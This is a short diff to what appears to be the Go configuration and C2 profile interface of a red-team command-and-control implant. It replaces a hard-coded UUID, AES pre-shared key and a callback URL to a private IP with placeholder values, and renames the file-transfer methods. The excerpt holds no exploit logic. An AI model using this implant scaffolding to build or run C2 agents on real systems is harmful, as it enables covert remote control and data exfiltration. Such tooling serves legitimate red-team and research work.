@@ -9,10 +9,10 @@ import (
 )
 
 var (
-	UUID                         = "9b77febd-527b-4b00-b3d5-1cd5acb7aac4"
+	UUID                         = "UUID"
 	ExchangeKeyString            = "T"
-	AesPSK                       = "oLRANTsFUwT6Lz85rfz05YVS8ugreGizo1bHtWDyRsY="
-	BaseURL                      = "http://192.168.193.140:9000/"
+	AesPSK                       = "AESPSK"
+	BaseURL                      = "http(s)://callback_host:callback_port/"
 	BaseURLs                     = []string{}
 	UserAgent                    = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3" // Change this value
 	Sleep                        = 10
@@ -31,9 +31,7 @@ type Profile interface {
 	// Start EKE key negotiation for encrypted comms
 	NegotiateKey() string
 	// C2 profile implementation for downloading files
-	Download(task structs.Task, params string)
-	// C2 profile implementation for uploading files
-	Upload(task structs.Task, fileid string) []byte
+	SendFile(task structs.Task, params string)
 	// C2 profile implementation to generate a unique session ID
 	GenerateSessionID() string
 	// C2 Profile implementation to get a file with specified id
